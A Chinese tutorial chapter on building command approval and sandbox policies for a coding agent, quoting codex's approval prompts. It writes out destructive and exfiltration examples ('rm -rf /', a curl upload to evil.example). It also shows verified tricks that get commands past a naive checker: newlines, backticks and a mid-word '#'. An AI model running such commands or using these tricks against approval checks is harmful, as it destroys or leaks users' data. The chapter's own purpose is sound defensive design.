# 第 5 章 · 审批与沙箱

> **代码**：`steps/step05_approval/`
> **分支**：`feat/approval`
> **产出**：Agent 在动手之前先问，而且问过的事不用问第二遍
> **前置**：做完插曲 A。全章的代码和测试都不需要模型；§14、§16–§18 里的模型对比是原始实测记录，照着读即可。
> **这一章很长**：它是全书第一处"攻击面"，代码和测试都比前面多得多。可以分两次读：§1–§11 是
> "判断一条命令是什么"，§12–§20 是"判断之后怎么办"。

---

## §0 开工前的准备

### 0.1 本章会遇到的新概念

- **攻击面**：程序里"别人可以利用来做坏事"的地方。前几章判断错了，结果是答案变差；
  这一章判断错了，结果是**别人的文件没了**。
- **允许名单 vs 拒绝名单**（allowlist / denylist）：允许名单列出"我确定可以的"，其余一律不行；
  拒绝名单列出"我知道不行的"，其余一律放行。第 2 章环境变量的白名单是前者。
- **分词（tokenize）**：把一行文字切成一个个"词"。Python 标准库的 `shlex` 模块能按 shell 的规则分词。
- **沙箱（sandbox）**：把程序关在一个受限的环境里，让它碰不到不该碰的东西。
  真正的沙箱要靠操作系统，这一章**不做**，§11.2 会说明这意味着什么。
- **审批（approval）**：程序要做某件事之前，先问人"可以吗"。

### 0.2 本章会遇到的新 Python 写法

| 写法 | 意思 |
|---|---|
| `from enum import Enum` / `class Risk(Enum): READ = 0` | **枚举**：一组有名字的固定取值 |
| `frozenset({...})` | 不可修改的集合；判断"在不在里面"很快 |
| `set(a) <= set(b)` | `a` 的每个元素都在 `b` 里（子集） |
| `shlex.shlex(text, posix=True, punctuation_chars=True)` | 按 shell 规则分词，并把 `;` `|` `&` 等单独切出来 |
| `string.ascii_letters`、`string.digits` | 标准库里现成的"所有英文字母""所有数字"字符串 |
| `class Approver(Protocol): async def ask(...)` | 第 0 章的 `Protocol`：任何有 `ask` 方法的对象都算 |
| `next((x for x in items if 条件), None)` | 找第一个满足条件的元素，找不到返回 `None` |
| `time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())` | 当前的 UTC 时间，格式化成文字 |

### 0.3 开分支

```bash
git switch main
git pull
git switch -c feat/approval
```

---

## §1 这一章要做出来的东西

第 4 章最后一句话是这一章的起点：

> 现在 Agent 能改任何文件、跑任何命令了。包括 `rm -rf`。

前面几章一直在加能力，一次都没问过"该不该"。这一章加一层判断：**命令在执行之前先被看一眼，
看不明白的就去问人，问过的记下来。**

听起来像加一个确认框。实际上这是全书目前唯一一处**攻击面**，所以这一章的标准和别的章不一样：

- 别的章，一个漏掉的边界情况是 bug；
- 这一章，一个漏掉的边界情况是**绕过**。

还有一个区别：前几章的故障是"代码做错了事"，而这一章最危险的几条故障是
**"代码以为自己看懂了，其实没看懂"**——它们不报错，测试全绿，而 bash 照样执行。

---

## §2 定需求，猜故障

需求：
- `run_shell` 和 `apply_patch` 执行前先判断；
- 两个可以配置的开关：**能做什么**（沙箱模式）和**有没有人可以问**（审批策略）；
- 问过的可以记住，记住的可以查看、可以撤销；
- 模型要知道自己能做什么，需要更多权限时有办法申请。

动工前的猜测清单，十一条：

| 编号 | 猜测 | 怎么判断 |
|---|---|---|
| F05-01 | `git status; rm -rf /` 这种用分号接上的命令，绕过"看开头"的检查 | 构造这样的命令 |
| F05-02 | 把 `git` 整个放行，连 `git push --force` 也放行了 | 同上 |
| F05-03 | `../../` 或符号链接绕过路径检查 | 构造这样的路径 |
| F05-04 | `python -c "..."` 在只读模式下写文件 | 同上 |
| F05-05 | `curl` 把数据送出去；`pip install` 装了恶意包 | 同上 |
| F05-06 | 每条都问，用户烦了，一路点"是" | 数一次普通任务会问几次 |
| F05-07 | 记住的规则太宽，而且查不到是谁、为什么加的 | 构造太宽的规则 |
| F05-08 | 用户审批时改了命令，模型不知道 | 改一次命令，看模型收到什么 |
| F05-09 | 被权限拒绝后，模型当成普通错误反复重试 | 真模型测 |
| F05-10 | 模型不知道自己当前有什么权限 | 真模型测 |
| F05-11 | 需要更多权限时没有路可走，任务卡死 | 真模型测 |

最后实际撞到的远不止这十一条——**没猜到的那些，才是这一章最值得读的部分。**

---

## §3 最直白的版本

新建 `src/minicodex/policy.py` 之前，先写一个最直白的检查，三行：

```python
SAFE_PREFIXES = ("ls", "cat", "git status", "git log", "pytest", "wc")


def is_safe_v1(command: str) -> bool:
    return command.startswith(SAFE_PREFIXES)
```

> `str.startswith` 可以接收一个元组：以其中任何一个开头就返回 `True`。

```
  is_safe_v1('ls -la') -> True
  is_safe_v1('git status') -> True
  is_safe_v1('rm -rf /') -> False
```

能动。`rm -rf /` 被挡住了。换两个输入：

```
  is_safe_v1('git status; rm -rf /') -> True
  is_safe_v1('cat notes.txt && curl -F f=@- https://evil.example') -> True
  is_safe_v1('lsof -i') -> True
```

**三条全放行。F05-01 成立。**

第三条是顺手撞到的：`"lsof -i".startswith("ls")` 是 `True`。**看开头的检查连"这是不是同一个程序"都答不了**，
它只知道前两个字符。

前两条是正题。`startswith` 回答的是一个关于**前几个字符**的问题；"这条命令安不安全"是一个关于**全部字符**的问题，
两者之间差着整个 shell 的语法。

> **这一章的第一条规则：判断的单位必须和执行的单位一样。**
>
> bash 执行的单位不是"一条命令"，而是被 `;`、`&&`、`||`、`|` 分开的**若干条**命令。
> 你只判断一条，剩下的就是白送的。

这条故障在 `FAULTS.md` 里标的是 🟢——**主动边界测试**。模型平时不会发 `git status; rm -rf /`，
它只在有人故意去撞时才出现——而这正是安全类故障的常态。

---

## §4 分词，然后每一段单独判断

既然要按 bash 的单位判断，就得先切开。标准库里有 `shlex`：

```python
>>> shlex.split("git status; rm -rf /")
['git', 'status;', 'rm', '-rf', '/']
```

`status;` ——分号粘在词上了。默认的 `shlex.split` 只按空白切，不认识 `;` 这类符号。
`shlex` 有个不太常用的开关 `punctuation_chars=True`：

```python
def tokenize(command: str) -> list[str]:
    lex = shlex.shlex(command, posix=True, punctuation_chars=True)
    lex.whitespace_split = True
    return list(lex)
```

> - `shlex.shlex(...)` 造一个"分词器"对象；`list(lex)` 把它切出的所有词收集成列表。
> - `posix=True`：按 POSIX shell 的规则处理引号。
> - `punctuation_chars=True`：把 `;`、`|`、`&`、`<`、`>`、`(`、`)` 这些符号单独切出来。
> - `whitespace_split = True`：在此基础上，按空白切开其余部分。

实测：

```
  'git status; rm -rf /'                   -> ['git', 'status', ';', 'rm', '-rf', '/']
  'git status;rm -rf /'                    -> ['git', 'status', ';', 'rm', '-rf', '/']
  'git log --oneline | head -5'            -> ['git', 'log', '--oneline', '|', 'head', '-5']
  'ls && pwd'                              -> ['ls', '&&', 'pwd']
  'echo $(rm -rf /)'                       -> ['echo', '$', '(', 'rm', '-rf', '/', ')']
  'cat a > b'                              -> ['cat', 'a', '>', 'b']
```

第二行是这个开关的价值：**`git status;rm` 中间没有空格，照样切开了。** 不开这个开关，`status;rm` 会被当成一个词，
一个只看第一个词的检查会认为这条命令叫 `git`。

有了词的列表，分段就是一个循环：

```python
SEPARATORS = frozenset({";", "&&", "||", "|"})


def segments_v2(command: str) -> list[list[str]]:
    out: list[list[str]] = [[]]
    for token in tokenize(command):
        if token in SEPARATORS:
            out.append([])
        else:
            out[-1].append(token)
    return [segment for segment in out if segment]
```

> `out` 是"段的列表"，每一段是一个词的列表。遇到分隔符就开一个新段，否则把词放进当前段（`out[-1]`，最后一段）。

每一段单独判断：

```
  'git status; rm -rf /'              -> [['git', 'status'], ['rm', '-rf', '/']]
                                         [('git', True), ('rm', False)]
  'git log --oneline | head -5'       -> [['git', 'log', '--oneline'], ['head', '-5']]
                                         [('git', True), ('head', True)]
```

`git status; rm -rf /` 现在会被拦住，因为第二段的 `rm` 不在名单上。

> **这也是 codex 的做法，而且它把这条规则写进了给模型看的提示里**
> （`codex-rs/prompts/templates/permissions/approval_policy/on_request.md`）：
>
> > The command string is split into independent command segments at shell
> > control operators, including but not limited to: Pipes `|`, Logical
> > operators `&&`, `||`, Command separators `;`, Subshell boundaries `(...)`,
> > `$(...)`. **Each resulting segment is evaluated independently.**

看起来这一节就该结束了。实际上真正的麻烦还没开始。

---

## §5 意外：一个换行

写测试时顺手试了一下换行——不是怀疑什么，是因为模型有时会发多行脚本：

```
  tokenize('ls\nrm -rf /tmp/x')
    -> ['ls', 'rm', '-rf', '/tmp/x']
  segments_v2 -> [['ls', 'rm', '-rf', '/tmp/x']]
  first word of the only segment: 'ls'  <- on the allowlist
```

**一段。开头是 `ls`。名单放行。**

`shlex` 把 `\n` 当成了空白，和空格一样。bash 不是——在 bash 里，换行是**命令分隔符**，和 `;` 一样。

这不是推测。真的跑一遍：

```
  exists before: True
  bash -c 'ls\nrm -f payload.txt'
    stdout: 'payload.txt\n'
  exists after:  False
```

（实测方法：先建一个 `payload.txt`，再用 bash 执行这条命令，然后检查文件还在不在。这里的输出来自 Windows 上 Git 自带的 bash；Linux、macOS 上的 bash 结果一样。）

`ls` 列出了那个文件，然后 `rm` 把它删了。检查器全程认为这是一条 `ls` 命令。

> **这是一次真正的绕过，而且是 🟡 静默的。** 没有异常，没有警告，测试全绿。
> 唯一的发现方式，是**有人故意把 `\n` 喂进去看看**。

这条不在 §2 的清单上。它比分号那条凶得多——分号至少还在词的列表里留着痕迹，换行**连痕迹都没有**。

---

## §6 意外：反引号和井号

既然换行有问题，那还有什么？把 shell 里所有"看起来像标点"的东西都试一遍。

### 6.1 反引号

```
  'echo `rm -rf /tmp/x`'  -> ['echo', '`rm', '-rf', '/tmp/x`']
```

在 bash 里，反引号里的内容会被**先执行**，结果再代入。`$( )` 能被 `punctuation_chars` 识别出来（上一节看到了），
反引号不能——它**粘进了词里**。

```
  exists before: True
  bash -c 'echo `rm -f payload.txt`'
  exists after:  False
```

### 6.2 一个井号

这一条是四条里最狠的。

```
  'ls #comment; rm -rf /'  -> ['ls']
```

`shlex` 默认把 `#` 当成注释的开头，后面全部丢掉。bash 也这么做——**但只在 `#` 位于词首时**。
词中间的 `#` 对 bash 来说就是个普通字符：

```
  shlex sees 'echo a#b'                           -> ['echo', 'a']
  shlex sees 'echo a#b; rm -rf /tmp/x'            -> ['echo', 'a']
  shlex sees 'echo "a#b"; rm -rf /tmp/x'          -> ['echo', 'a#b', ';', 'rm', '-rf', '/tmp/x']
```

第二行：**整条命令的后半截消失了。** 不是判断错了——是根本没被看到。

```
  exists before: True
  bash -c 'echo a#b; rm -f payload.txt'
  exists after:  False
```

第三行说明这不是 `#` 本身的问题：加了引号，`shlex` 就正常了。**同一个字符，在两种上下文里，两个工具的理解不一样。**

> 前两条绕过丢的是"一部分信息"。这一条丢的是**任意多**的信息——`#` 后面写多长都一样，
> 检查器看到的永远是 `['echo', 'a']`。

### 6.3 顺带撞到的两条

```
  'ls "unterminated'  -> ValueError: No closing quotation
  'ls;;rm'            -> ['ls', ';;', 'rm']
```

第一条会抛异常。第 0 章的规则：**在模型能触发的地方抛异常，就等于结束这次会话。** 这里必须变成一个返回值。

第二条 `;;` 是 shell 里 `case` 语句的结束符，不在我们的四个分隔符里，`shlex` 把它当成一个整体交了出来。

---

## §7 别再补洞了：把问题反过来

现在手上有四个洞：换行、反引号、`#`、`;;`。一个个补是很自然的想法：

```python
if "\n" in command or "`" in command or "#" in command:
    return None
```

**这行代码的问题不是它不对，而是它凭什么对。** 它成立的前提是"这四个就是全部"。找到这四个没花多少功夫——
没有理由相信再找一会儿找不到第五个。写下这行，就是在赌一个没有任何证据的判断。

所以把问题反过来问：

> 不是"哪些字符我要拒绝"，而是**"哪些字符我确实实现了它的含义"**。

```python
_MODELLED = frozenset(string.ascii_letters + string.digits + " \t" + "-_./=:,+@%~'\";|&")
```

一行判断，四个洞一起关上：

```python
    if any(character not in _MODELLED for character in command):
        return None
```

**这是允许名单，不是拒绝名单。** 一个没想到的写法，默认落在"不认识"这一边，而不是"放行"那一边。

> 第 2 章做过同样的选择：子进程的环境变量用白名单而不是黑名单，理由一样——**黑名单的上限是写它的人的想象力。**

### 7.1 `None` 是什么意思

`segments()` 返回 `None` 时，它说的**不是"这条命令危险"**，而是"这一层给不出判断"。上层把它变成"去问人"，
永远不变成"放行"，也不直接变成"拒绝"。

这个区分是有代价的，而且代价看得见：`grep -rn "foo.*bar" src/` 里的 `*` 在引号里，根本不是通配符，
但字符检查看不出上下文，于是它也要问一次。

**接受这个代价，因为它错的方向是对的**：多问一次是烦，少问一次是丢文件。

> 这和 codex 的选择一致。它的提示原文：
>
> > Commands that use more advanced shell features like redirection (`>`, `>>`,
> > `<`), substitutions (`$(...)`), environment variables (`FOO=bar`), or
> > wildcard patterns (`*`, `?`) **will not be evaluated against rules**, to
> > limit the scope of what an approved rule allows.
>
> 注意 codex 是有真正的 shell 解析器的（tree-sitter-bash）。**即便如此，它对这些写法的处理也是"不参与规则匹配"**，
> 而不是"解析明白了再放行"。**有解析器和敢放行，是两件事。**

### 7.2 一个只有写断言时才会现形的 bug

分段循环里要处理"不是那四个分隔符的标点"（比如 `;;`、`>`）。第一版写的是：

```python
        elif token in _MODELLED and not token.isalnum() and set(token) <= set(";|&"):
```

`_MODELLED` 是**单个字符**的集合，而这时的 `token` 是 `";;"`——两个字符。`";;" in _MODELLED` 永远是 `False`，
**这个分支从来没执行过**：

```
  'ls;;rm'  ->  [['ls', ';;', 'rm']]
```

一段，中间夹着一个叫 `;;` 的"参数"。开头是 `ls`，放行。发现它的方式不是读代码，而是把 §6.3 那个 `ls;;rm`
写成断言。**一个以为写完了的防御，实际上是一行装饰。** 正确的写法是 `set(token) <= _PUNCTUATION`：
"这个词的每个字符都是标点"。

### 7.3 `shell_parse.py`

把以上这些收成一个模块。新建 `src/minicodex/shell_parse.py`，这是它的全部内容：

```python
"""Splitting one command string into the pieces a policy can judge.

The model sends `run_shell` a single string.  Deciding whether that string is
safe by looking at its prefix does not work, and chapter 5 measured three
separate ways the obvious improvement -- tokenise it, then judge each command
-- does not work either.

`shlex` is a tokeniser, not a shell parser.  Where the two disagree, they
disagree *silently*, and every disagreement found was in the dangerous
direction: `shlex` saw less than bash ran.

    'ls\\nrm -f payload.txt'      shlex: ['ls', 'rm', '-f', 'payload.txt']
                                  bash:  two commands; the file was deleted

    'echo `rm -f payload.txt`'    shlex: ['echo', '`rm', '-f', 'payload.txt`']
                                  bash:  substitution ran; the file was deleted

    'echo a#b; rm -f payload.txt' shlex: ['echo', 'a']
                                  bash:  `#` mid-word is not a comment; the
                                         file was deleted

The third is the worst: `shlex` treats `#` as starting a comment and drops the
entire rest of the line, so a checker looking at the first word sees `echo` and
approves a command whose tail it never saw.  All three were verified by running
bash on a real file and checking whether it survived.

Patching them one at a time is a losing game -- each fix is a guess that the
list of disagreements is now complete.  So the question is inverted.  Instead
of listing constructs we refuse, `_MODELLED` lists the characters whose meaning
this module actually implements; anything else makes the command *unknown*.

`None` does not mean "dangerous".  It means "this module cannot say", which the
policy layer turns into "ask the user" -- never into "allow".  A construct
nobody thought of therefore defaults to a question, not to an approval.  Same
rule as chapter 2's environment allowlist, and for the same reason: a blocklist
is only as good as the imagination of whoever wrote it.

codex draws the line in the same place.  Its own prompt template
(`prompts/templates/permissions/approval_policy/on_request.md`) tells the model:

    Commands that use more advanced shell features like redirection (>, >>, <),
    substitutions ($(...), ...), environment variables (FOO=bar), or wildcard
    patterns (*, ?) will not be evaluated against rules, to limit the scope of
    what an approved rule allows.
"""

from __future__ import annotations

import shlex
import string

# The four operators that sequence commands without changing what any of them
# means.  codex splits on exactly these (plus subshell boundaries, which land
# in the unknown bucket here).
SEPARATORS = frozenset({";", "&&", "||", "|"})

# `punctuation_chars=True` makes `shlex` emit runs of these as their own tokens.
# Anything it emits that is made only of them and is not in `SEPARATORS` is an
# operator we do not model -- a bare `&` backgrounds, `;;` is a case terminator.
_PUNCTUATION = frozenset(";|&<>()")

# Every character this module claims to understand.  Deliberately short:
# growing it is a decision someone has to make on purpose, and every addition
# needs an answer to "what does bash do with this, and does the tokeniser
# agree?"
#
#   -_./          paths and flags
#   =             `--include=x`; a leading `FOO=bar` is caught separately below
#   :,+@%~        version specifiers, ranges, emails, git format strings
#   '"            quoting; an unbalanced one raises and lands in `None`
#   ;|&           the separators, assembled by the tokeniser
#
# Not here, on purpose: `` ` `` $ ( ) < > * ? [ ] { } ! \ # and newline.
_MODELLED = frozenset(string.ascii_letters + string.digits + " \t" + "-_./=:,+@%~'\";|&")


def segments(command: str) -> list[list[str]] | None:
    """Split `command` into independently judgeable word lists.

    Returns `None` when the command contains anything this module does not
    model.  Callers must treat `None` as "cannot be auto-approved", not as
    "reject": a `curl ... | sh` and a `grep 'foo.*bar' .` both land here, and
    only a human can tell them apart.
    """
    if not command.strip():
        return None

    if any(character not in _MODELLED for character in command):
        return None

    lex = shlex.shlex(command, posix=True, punctuation_chars=True)
    lex.whitespace_split = True
    try:
        tokens = list(lex)
    except ValueError:
        # "No closing quotation" -- the string is not a command yet.  Chapter 2
        # learned this the expensive way: an exception raised where the model
        # can see it ends the session, so this becomes a `None` and the policy
        # layer turns it into a question.
        return None

    out: list[list[str]] = [[]]
    for token in tokens:
        if token in SEPARATORS:
            out.append([])
        elif set(token) <= _PUNCTUATION:
            # `;;`, `&`, `|&` and friends: punctuation the tokeniser grouped
            # into something that is not one of our four operators.  The first
            # version of this line also tested `token in _MODELLED`, which is a
            # set of single characters -- so `";;"` was never in it and the
            # branch never ran.  `ls;;rm` came back as one segment whose middle
            # word was `;;`.
            return None
        else:
            out[-1].append(token)

    if any(not segment for segment in out):
        # A leading, trailing or doubled separator.  Rare, and the shapes it
        # takes (`;; `, `| |`) are ones bash reads differently from this loop.
        return None

    for segment in out:
        # `FOO=bar cmd` runs `cmd` with a modified environment, which can change
        # what `cmd` does without changing any word this module inspects --
        # `GIT_SSH_COMMAND=... git fetch` being the sharp example.
        if "=" in segment[0]:
            return None

    return out
```

> - 开头的长 docstring 记下了 §5、§6 的三次实测，以及为什么要把问题反过来问。
>   **删掉这些注释，下一个人只会把 `_MODELLED` 当成一个可以随手加字符的常量。**
> - `_MODELLED` 上面的注释逐组说明了每类字符为什么在里面，以及哪些**故意不在**。
> - **`segments()` 里的几个 `return None`**，挡的是不同的东西：
>   1. 空命令——不是"没风险"，是"没内容可判断"；
>   2. 有不在 `_MODELLED` 里的字符；
>   3. 引号没闭合，`shlex` 抛 `ValueError`——接住它，变成 `None`；
>   4. 不是四个分隔符之一的标点（`;;`、`>`、`(` 等），用 `set(token) <= _PUNCTUATION` 判断；
>   5. 开头、结尾或连续的分隔符（`; ls`、`ls ;`），`bash` 对它们的理解和这个循环不一样；
>   6. 某一段的第一个词含 `=`：这是 `FOO=bar cmd` 这种"先设环境变量再执行"的写法，命令本身一个词都没变，
>      行为却变了。

测试要等 §11 写完判断规则之后一起加：分段本身是纯函数，但测试检查的是"这条命令最后被怎么判"，
那需要下面几节的 `policy.py`。

---

## §8 F05-02：`git` 不是一个命令，是一族

`_MODELLED` 关上的是"语法层"的洞。接下来是"含义层"的。

`ls` 就是 `ls`，`rm` 就是 `rm`。`git` 不是——`git status` 只读，`git push --force` 改的是**别人机器上的**东西。
把 `git` 整个放进只读名单，等于把 `git reset --hard` 一起放了进去。**F05-02 成立。** 所以按子命令判断：

```python
GIT_READ_ONLY_SUBCOMMANDS = frozenset(
    {"blame", "branch", "diff", "log", "ls-files", "rev-parse", "show", "status"}
)
```

但真正麻烦的不是子命令，是**子命令前面的东西**。

### 8.1 全局选项

```bash
git -C /elsewhere status
git -c core.pager=less log
git --git-dir=/other/.git log
```

三条命令，子命令分别是 `status`、`log`、`log`，**全在只读名单上**。但：

- 第一条读的是**另一个仓库**；
- 第二条改了 git 的配置：`core.pager` 是 git 用来分页显示输出的程序。这里写的是 `less`，
  换成任何别的程序，git 都会照样去执行它；
- 第三条同样指向别处。

一个"找到已知子命令就说安全"的检查，会把这三条全放过去。所以出现在子命令**之前**的这些选项，一律当成"不认识"：

```python
GIT_UNSAFE_GLOBAL_OPTIONS = (
    "-C", "-c", "-p", "--paginate", "--git-dir", "--work-tree",
    "--exec-path", "--namespace", "--config-env", "--super-prefix",
)
```

codex 也是按子命令、并且检查全局选项来判断 git 的（在 `shell-command/src/command_safety/is_safe_command.rs` 里）。
这种表的价值全在完整，而完整来自有人被坑过——**能参考现成的实现，就别自己从零列。**

实测（只读模式，需要时问）：

```
  'git -C /elsewhere status'         ASK    UNKNOWN
  'git -c core.pager=less log'       ASK    UNKNOWN
  'git --git-dir=/other/.git log'    ASK    UNKNOWN
```

### 8.2 同一个子命令，两种行为

```bash
git branch            # 列出分支
git branch -d main    # 删除分支
```

子命令一样，差别全在参数里。所以 `branch` 再单独判断一次，只有这些选项算只读：

```python
GIT_BRANCH_READ_ONLY_FLAGS = frozenset(
    {"--list", "-l", "--show-current", "-a", "--all", "-r", "--remotes", "-v", "-vv", "--verbose"}
)
```

再加上以 `--format=` 开头的选项（它只决定输出的格式）。**这里也是允许名单**：不认识的选项一律当成会改东西。

```
  'git branch'                       ALLOW  READ
  'git branch -d main'               ASK    WRITE
```

### 8.3 `git push` 不是"改文件"

很自然的归类是：不在只读名单上的 git 子命令都算"写"（WRITE），`git push --force` 也一样。**这样归类低估了它。**
"写"的意思是"改本地文件"，而 `git push --force` 改的是**服务器上的历史**，而且**不可撤销**——本地文件改错了能改回来，
别人的分支被覆盖了，要靠别人手里还有没有旧的记录。

```python
GIT_NETWORK_SUBCOMMANDS = frozenset({"clone", "fetch", "pull", "push", "remote", "submodule"})
```

这个改动有实际后果：后面会看到，有一种模式允许"写"；如果 `push` 算"写"，它就被自动放行了。归成"网络"（NETWORK）之后不会。

---

## §9 F05-04：分词救不了解释器

到这里为止的思路都是"看得更仔细"。这一节是这条思路的尽头。

```
  'ls -l'                                          -> ['ls', '-l']
  'python -c \'open("/tmp/x","w").write("pwned")\'' -> ['python', '-c', 'open("/tmp/x","w").write("pwned")']
  'node -e \'require("fs").rmSync("/tmp/x")\''      -> ['node', '-e', 'require("fs").rmSync("/tmp/x")']
  "bash -c 'rm -rf /tmp/x'"                        -> ['bash', '-c', 'rm -rf /tmp/x']
```

**分词一点问题都没有。** 三个干干净净的词，没有任何不认识的字符。第三个词是一整个程序，而这一层对它一无所知。

> **这就是"解析"这条路的边界。** 你可以把 shell 语法解析得任意精细，**解释器的参数是另一门语言**，不在你的语法树里。

所以 F05-04 只能**按类别判断**，不能靠解析：

```python
INTERPRETERS = frozenset(
    {"ash", "awk", "bash", "csh", "dash", "deno", "env", "eval", "exec", "fish",
     "irb", "ksh", "node", "perl", "php", "python", "python2", "python3",
     "ruby", "sh", "source", "tclsh", "xargs", "zsh"}
)
```

`env` 和 `xargs` 在这张表里，值得说一句：它们本身不是解释器，但 `env FOO=1 rm -rf /` 和 `xargs rm < list`
都是"拿别的程序当参数"，性质一样。

> codex 从另一个方向说了同一件事，写在给模型看的提示里，标题叫 **Banned prefix_rules**：
>
> > Avoid requesting overly broad prefixes that the user would be ill-advised to
> > approve. For example, do not request `["python3"]`, `["python", "-"]`, or
> > other similar prefixes that would allow arbitrary scripting.

### 9.1 F05-05：网络

同样的道理，另一类：能把数据送出这台机器、或者把代码拉进来的命令：

```python
NETWORK = frozenset(
    {"cargo", "curl", "gh", "nc", "ncat", "npm", "npx", "pip", "pip3", "pnpm",
     "rsync", "scp", "sftp", "ssh", "telnet", "uv", "wget", "yarn"}
)
```

`pip` 整个在里面，不分子命令：`pip download` 会下载，`pip install` 下载**并且执行**安装脚本。
供应链攻击就是这个样子：`pip install` 一个名字拼错一个字母的包，安装过程中恶意代码就跑起来了。

**这一章不阻止网络，只是识别它。** 真正的网络策略（代理、允许访问的域名清单）是另一个量级的工程，
codex 有一整个 `network-proxy` 模块。识别出来交给人判断，是这一层能做的全部。

### 9.2 表和表之间不能重叠

判断时按固定顺序查表：

```python
def classify(words: list[str]) -> Risk:
    """The worst thing one segment could do."""
    name = words[0].rsplit("/", 1)[-1]
    if name in INTERPRETERS:
        return Risk.INTERPRETER
    if name in NETWORK:
        return Risk.NETWORK
    if name in WRITES:
        return Risk.WRITE
    if name == "git":
        return _git_risk(words)
    if name in READ_ONLY:
        return Risk.READ
    return Risk.UNKNOWN
```

> - `words[0].rsplit("/", 1)[-1]`：从右边切一次 `/`，取最后一段。`/usr/bin/python` 和 `python` 必须是同一件事，
>   否则加一个路径前缀就绕过了整张表。实测：`'/usr/bin/python x.py'` → `ASK INTERPRETER`。
> - 查表顺序就是危险程度的顺序：解释器 → 网络 → 写 → git（要细分）→ 只读。都不在就是 `UNKNOWN`（不认识）——
>   **不认识不是放行**。

一个命令如果同时在两张表里，**结果取决于查表顺序**，而且没有任何东西会提醒你。所以后面有一个测试专门检查
"没有命令同时出现在两张表里"。

---

## §10 F05-03：以为要修，结果第 4 章已经修好了

F05-03 说的是"路径检查用字符串比较，`../../` 和符号链接能绕过"。按顺序它该在这一章修。
但第 4 章修路径洞时，已经把 `paths.resolve()` 改成了"先解析，再判断"——而 `Path.resolve()` 本身会展开符号链接。
所以这条**可能**已经关上了。

**"可能"不是结论。** 正确的动作不是读代码下判断，而是写一个测试去撞。§11 结尾会加两个测试：
一个是相对路径往上爬（`../../../../etc/passwd`），一个是指向仓库外的符号链接。符号链接那个测试里有一句关键的断言：

```python
    assert str(root / "link").startswith(str(root)), "a string comparison says yes"
```

它先证明**字符串比较会说"在里面"**，再证明我们的实现说"不在"。一个只断言"结果是不在"的测试，
在实现退化成字符串比较之后，仍然可能是绿的。

> 结果：这条不需要新代码。**如实记一笔比"再实现一遍"更有价值**——这一章的产出里没有 F05-03 的代码，只有它的测试。

### 10.1 而这个测试在 Windows 上没跑

```
SKIPPED [1] tests\test_approval.py:241: symlink creation needs privileges on this platform
```

Windows 上创建符号链接需要管理员权限或开发者模式，所以**符号链接那个测试在 Windows 上一次都没真正执行过**。
相对路径那一半跑了，是绿的；符号链接那一半是一个"跳过"。

留着它，理由和第 2 章的 F02-10 一样：**一个"跳过"说的是"这里没被验证"，一个被删掉的测试说的是"这里没问题"，
后者是说不出口的话。** F05-03 在 Windows 上的诚实状态是：相对路径已验证，符号链接未在本机验证，推理上由
`Path.resolve()` 覆盖。在 macOS/Linux 上，它会真正运行。

---

## §11 两个开关，和一个不肯撒谎的缺口

前面十节都在回答"这条命令是什么"。接下来是"那又怎样"。

codex 把这件事拆成两个独立的设置，这里照做，因为这个拆法是对的：

```python
SandboxMode = Literal["read-only", "workspace-write", "full-access"]
ApprovalPolicy = Literal["never", "on-request", "unless-trusted"]
```

- **沙箱模式**：不问任何人的情况下，能做什么——只读 / 能写工作区 / 什么都能做。
- **审批策略**：其余的事怎么办——从不问（`never`，直接拒绝）/ 需要时问（`on-request`）/ 除了只读都问（`unless-trusted`）。

为什么分开？因为它们回答的是不同的问题。"这个 Agent 能不能写文件"关于**任务**；"现在有没有人坐在键盘前"关于**会话**。
在 CI 里跑，要的是"只读 + 从不问"；开发者盯着终端，要的是"能写工作区 + 需要时问"。
合成一个设置，这几种有用的组合就配不出来了。

两个开关一共九种组合。实测其中两种（第一列是命令，第二列是结论，第三列是风险）：

```
--- read-only | on-request
    'ls -la'                 ALLOW  READ
    'git status'             ALLOW  READ
    'git status; rm -rf /'   ASK    WRITE
    'git push --force'       ASK    NETWORK
    'pytest -q'              ASK    UNKNOWN
    'python script.py'       ASK    INTERPRETER
    apply_patch              ASK    WRITE
--- workspace-write | never
    'ls -la'                 ALLOW  READ
    'git status'             ALLOW  READ
    'git status; rm -rf /'   DENY   WRITE
    'git push --force'       DENY   NETWORK
    'pytest -q'              DENY   UNKNOWN
    'python script.py'       DENY   INTERPRETER
    apply_patch              ALLOW  WRITE
```

第二种就是 CI 该用的配置：能读、能用 `apply_patch` 改仓库里的文件、其余一律拒绝，而且不会卡在一个没人回答的问题上。

注意 `pytest -q`：它不在任何一张表里，所以是 `UNKNOWN`，在两种配置下都不会被自动放行。这是故意的——
`pytest` 会执行测试文件里的任意代码，本质上是一个解释器。要让它不再每次都问，靠的是后面的"记住规则"，而不是把它塞进只读名单。

### 11.1 `never` 不等于"放行"

```python
def _apply_policy(risk: Risk, policy: ApprovalPolicy, reason: str) -> Verdict:
    if policy == "never":
        return Verdict(Decision.DENY, risk, f"{reason}, and there is nobody to ask")
    return Verdict(Decision.ASK, risk, reason)
```

这是最容易写反的一处。"不询问"很容易被实现成"不询问，直接跑"——那就等于给审批机制接了一根短路线。
**没人可问的时候，唯一诚实的答案是"不做"。**

### 11.2 `workspace-write` 到底允许了什么

这是这一章最重要的一个设计决定，而它的结论是**一个缺口**。先看最自然的写法：

```python
_ALLOWED_BY_MODE = {
    "read-only": frozenset({Risk.READ}),
    "workspace-write": frozenset({Risk.READ, Risk.WRITE}),   # <-- 看起来很自然
    "full-access": frozenset(Risk),
}
```

把 `WRITE` 加进 `workspace-write` 之后实测（`workspace-write`，需要时问）：

```
  'rm -rf /'   ALLOW  WRITE
  'rm -rf ~'   ALLOW  WRITE
```

**`rm -rf /` 被自动放行了。**

问题出在哪？`workspace-write` 的意思是"能写**工作区里的**文件"。而对一条 shell 命令来说，"写到哪里"根本无从判断：
`rm -rf $HOME`、`rm -rf build`、`rm -rf ../../..` 长得一样，路径参数在 shell 展开之前只是一个字符串。

真正能保证"只写工作区"的，是**操作系统级的沙箱**：macOS 的 seatbelt、Linux 的 landlock、Windows 的 job object。
codex 三个都实现了。**这一章不做这个。**

那怎么办？两个选项：让 `workspace-write` 悄悄地实际意味着"能写任何地方"；或者让它诚实一点。选后者：

```python
_SHELL_ALLOWED_BY_MODE: dict[SandboxMode, frozenset[Risk]] = {
    "read-only": frozenset({Risk.READ}),
    "workspace-write": frozenset({Risk.READ}),      # <-- 没有 WRITE
    "full-access": frozenset(Risk),
}

_WRITE_TOOL_ALLOWED_BY_MODE: dict[SandboxMode, bool] = {
    "read-only": False,
    "workspace-write": True,
    "full-access": True,
}
```

